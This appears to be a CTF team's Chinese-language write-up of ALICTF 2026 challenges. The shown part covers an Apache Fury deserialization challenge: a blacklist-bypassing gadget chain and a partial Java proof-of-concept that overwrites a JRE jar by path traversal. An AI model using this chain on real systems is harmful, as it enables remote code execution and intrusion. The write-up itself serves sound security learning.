<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2026 ALICTF SU WriteUp -</title><meta name=description content="本次 ALICTF 我们 SU 取得了 第十名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
以下是我们 SU 本次 2026 ALICTF 的 WriteUp。"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/alictf-su-2026-wu\/","name":"2026 alictf su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2026 ALICTF SU WriteUp","description":"本次 ALICTF 我们 SU 取得了 第十名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。\n以下是我们 SU 本次 2026 ALICTF 的 WriteUp。\n","inLanguage":"en","wordCount":9885,"datePublished":"2026-02-02T22:24:15\u002b08:00","dateModified":"2026-02-02T22:24:15\u002b08:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["alictf"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/alictf-su-2026-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2026 ALICTF SU WriteUp"><meta property="og:description" content="本次 ALICTF 我们 SU 取得了 第十名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
以下是我们 SU 本次 2026 ALICTF 的 WriteUp。"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/alictf-su-2026-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2026 ALICTF SU WriteUp"><meta name=twitter:description content="本次 ALICTF 我们 SU 取得了 第十名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
以下是我们 SU 本次 2026 ALICTF 的 WriteUp。"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href="https://su-team.cn/css/codeblock.css?v=20260212-fix3"><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2026 ALICTF SU WriteUp</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on February 2, 20215
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;47&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;9885&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#fileury>Fileury</a></li><li><a href=#mhga>MHGA</a><ul><li><a href=#入口点><strong>入口点</strong></a></li><li><a href=#stage-1--hessian-链构造><strong>Stage 1:</strong> <strong>Hessian</strong> <strong>链构造</strong></a></li><li><a href=#stage-2--viburdbcpobjectfactory到-databricks-jdbc><strong>Stage 2: ViburDBCPObjectFactory到 Databricks</strong> <strong>JDBC</strong></a></li><li><a href=#stage-3--获取flag>Stage 3: 获取FLAG</a></li></ul></li><li><a href=#easy_login>easy_login</a></li><li><a href=#cutter>Cutter</a></li><li><a href=#backup-exec>Backup Exec</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#rag投毒挑战>RAG投毒挑战</a></li><li><a href=#auction>Auction</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#syncvault>SyncVault</a></li></ul></li><li><a href=#reverse>Reverse</a><ul><li><a href=#pixelflow>pixelflow</a></li><li><a href=#thief>thief</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>本次 ALICTF 我们 SU 取得了 第十名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_<a href=mailto:xctf@126.com>xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p><p>以下是我们 SU 本次 2026 ALICTF 的 WriteUp。</p><p><img src=/img/2026-alictf/1.png alt=img></p><h1 id=web>Web</h1><h2 id=fileury>Fileury</h2><p>自 RCTF 一役沉寂许久，中间更是在 0CTF 被打得找不着北，未曾想今朝阿里云 CTF 竟让我寻回了用武之地。</p><p>话不多说，直接看题，题目使用 Apache Fury 进行反序列化，配置如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=n>Fury</span><span class=w> </span><span class=n>fury</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Fury</span><span class=p>.</span><span class=na>builder</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>.</span><span class=na>withLanguage</span><span class=p>(</span><span class=n>Language</span><span class=p>.</span><span class=na>JAVA</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>.</span><span class=na>requireClassRegistration</span><span class=p>(</span><span class=kc>false</span><span class=p>)</span><span class=w>  </span><span class=c1>// 允许反序列化未注册类</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>.</span><span class=na>build</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fury</span><span class=p>.</span><span class=na>deserialize</span><span class=p>(</span><span class=n>Base64</span><span class=p>.</span><span class=na>getDecoder</span><span class=p>().</span><span class=na>decode</span><span class=p>(</span><span class=n>input</span><span class=p>));</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Fury 通过 <code>fury/disallowed.txt</code> 维护一份类黑名单，在反序列化时会检查类名是否在黑名单中。</p><p><strong>黑名单检查逻辑</strong> (<code>DisallowedList.java</code>):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>checkNotInDisallowedList</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>clsName</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>DEFAULT_DISALLOWED_LIST_SET</span><span class=p>.</span><span class=na>contains</span><span class=p>(</span><span class=n>clsName</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InsecureException</span><span class=p>(</span><span class=n>String</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=s>&#34;%s hit disallowed list&#34;</span><span class=p>,</span><span class=w> </span><span class=n>clsName</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>黑名单包含了大部分常用反序列化 Gadget 类:</p><p>复盘去年 WP 发现，当前环境缺失了 <code>com.feilong</code> 依赖，导致二次反序列化绕过黑名单的方案失效，这也意味着挖掘新利用链</p><p><img src=/img/2026-alictf/2.png alt=img></p><p>先分析一下黑名单，包含了大部分常用反序列化 Gadget 类:</p><table><thead><tr><th>Gadget 类</th><th>状态</th></tr></thead><tbody><tr><td><code>TemplatesImpl</code></td><td>❌ 被拦截</td></tr><tr><td><code>InvokerTransformer</code></td><td>❌ 被拦截</td></tr><tr><td><code>ChainedTransformer</code></td><td>❌ 被拦截</td></tr><tr><td><code>ConstantTransformer</code></td><td>❌ 被拦截</td></tr><tr><td><code>TiedMapEntry</code></td><td>❌ 未在黑名单但依赖的 Transformer 被拦截</td></tr><tr><td><code>BadAttributeValueExpException</code></td><td>❌ 被拦截</td></tr></tbody></table><p><strong>未被拦截的关键类</strong>:</p><ul><li><code>org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap</code></li><li><code>org.apache.commons.collections.map.LazyMap</code></li><li><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code></li><li><code>org.apache.commons.collections.comparators.TransformingComparator</code></li><li><code>org.apache.commons.collections.functors.ConstantFactory</code></li><li><code>org.apache.commons.collections.functors.StringValueTransformer</code></li></ul><p>起初试图复刻去年的思路挖掘二次反序列化，但此路俺没走通，失败了</p><p><img src=/img/2026-alictf/3.png alt=img></p><p>就在一筹莫展之际，猛地想起老大梅子酒在 Non-RCE 题解中提到的 <code>StoreableCachingMap</code> 链子。这条链子能实现任意路径写文件，幸运地避开了黑名单的拦截**！**</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=n>HashSet</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>HashMap</span><span class=p>.</span><span class=na>put</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=p>.</span><span class=na>hash</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>TiedMapEntry</span><span class=p>.</span><span class=na>hashCode</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>TiedMapEntry</span><span class=p>.</span><span class=na>getValue</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>LazyMap</span><span class=p>.</span><span class=na>get</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>SimpleCache$StorableCachingMap</span><span class=p>.</span><span class=na>put</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                            </span><span class=n>SimpleCache$StorableCachingMap</span><span class=p>.</span><span class=na>writeToPath</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=n>FileOutputStream</span><span class=p>.</span><span class=na>write</span><span class=p>()</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/img/2026-alictf/4.png alt=img></p><p><strong>适配Fury 完整<strong><strong>POC</strong></strong>如下：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>reproduce</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.comparators.TransformingComparator</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ConstantFactory</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.StringValueTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.map.LazyMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.fury.Fury</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.fury.config.Language</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.nio.file.Files</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.nio.file.Paths</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Map</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.PriorityQueue</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>ExpAspectJ</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Goal: Arbitrary File Write</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Chain:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// PriorityQueue.readObject() -&gt; heapify() -&gt; comparator.compare()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// comparator = TransformingComparator(StringValueTransformer)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// transformer.transform(TiedMapEntry) -&gt; TiedMapEntry.toString()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// TiedMapEntry.toString() -&gt; getValue() -&gt; map.get(key)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// map = LazyMap(StoreableCachingMap, ConstantFactory(bytes))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// LazyMap.get(key) -&gt; factory.create(key) -&gt; bytes</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// LazyMap.put(key, bytes) -&gt; StoreableCachingMap.put(key, bytes) -&gt; write bytes to file &#39;key&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>content</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Files</span><span class=p>.</span><span class=na>readAllBytes</span><span class=p>(</span><span class=n>Paths</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;dnsns.jar&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>filename</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/dnsns.jar&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        byte[] content = cronPayload.getBytes();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 1. Setup StoreableCachingMap (The Inner Map)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Ensure access to the class</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>scMapClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>constructor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>scMapClass</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>constructor</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// folder = &#34;.&#34;, maxEntries = 100</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>storeableMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Map</span><span class=p>)</span><span class=w> </span><span class=n>constructor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=s>&#34;.&#34;</span><span class=p>,</span><span class=w> </span><span class=n>100</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 2. Setup LazyMap with ConstantFactory</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ConstantFactory</span><span class=w> </span><span class=n>factory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ConstantFactory</span><span class=p>(</span><span class=n>content</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>lazyMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>LazyMap</span><span class=p>.</span><span class=na>decorate</span><span class=p>(</span><span class=n>storeableMap</span><span class=p>,</span><span class=w> </span><span class=n>factory</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
